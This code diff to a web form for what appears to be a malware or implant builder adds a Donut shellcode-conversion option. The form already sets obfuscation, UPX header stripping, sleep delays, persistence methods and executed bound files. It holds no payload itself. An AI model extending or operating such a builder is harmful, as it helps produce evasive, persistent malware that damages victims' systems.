@@ -103,6 +103,7 @@ function saveFormSettings() {
       garbleSeed: document.getElementById("garble-seed")?.value ?? "",
       enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
       upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
+      enableDonut: document.querySelector('input[name="enable-donut"]')?.checked ?? false,
       sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
       enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
       persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
@@ -151,6 +152,7 @@ function restoreFormSettings() {
     if (s.garbleSeed !== undefined) setVal("garble-seed", s.garbleSeed);
     if (s.enableUpx !== undefined) setCb('input[name="enable-upx"]', s.enableUpx);
     if (s.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', s.upxStripHeaders);
+    if (s.enableDonut !== undefined) setCb('input[name="enable-donut"]', s.enableDonut);
     if (s.sleepSeconds !== undefined) setVal("sleep-seconds", s.sleepSeconds);
     if (s.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', s.enablePersistence);
     if (Array.isArray(s.persistenceMethods)) {
@@ -619,6 +621,7 @@ form?.addEventListener("submit", async (e) => {
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
+    enableDonut: form.querySelector('input[name="enable-donut"]')?.checked || false,
     boundFiles: boundFiles.length > 0
       ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
       : undefined,
